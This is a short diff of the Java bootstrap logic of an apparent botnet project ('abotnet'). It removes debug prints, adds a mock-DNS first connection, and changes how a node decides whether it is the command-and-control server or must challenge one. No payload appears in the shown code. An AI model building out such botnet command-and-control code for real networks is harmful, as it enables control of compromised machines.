@@ -8,11 +8,9 @@ import java.util.Collections;
 import java.util.List;
 
 import org.springframework.beans.factory.annotation.Autowired;
-import org.springframework.boot.SpringApplication;
 import org.springframework.scheduling.annotation.Async;
 import org.springframework.stereotype.Service;
 
-import cs.sii.abotnet.Application;
 import cs.sii.config.onLoad.Config;
 import cs.sii.domain.IP;
 import cs.sii.domain.Pairs;
@@ -77,12 +75,11 @@ public class Behavior {
 	 */
 	public void initializeBot() {
 
+		nServ.firstConnectToMockServerDns();
 		
-		System.out.println("SONO QUA");
-		if(nServ.getCommandConquerIps().getList().get(0).getValue1().getIp().equals(nServ.getMyIp().getIp())){
+		if(nServ.getCommandConquerIps().getList().get(0).getValue1().getIp().equals(nServ.getMyIp().getIp()))
 			eng.setCommandandconquerStatus(true);
-			System.out.println("SONo cec");
-		}else{			
+		
 		if (challengeToCommandConquer()) {
 			System.out.println("Bot is Ready");
 		} else
@@ -98,7 +95,6 @@ public class Behavior {
 		} else
 			System.out.println("torno null");
 
-		}
 	}
 
 	/**
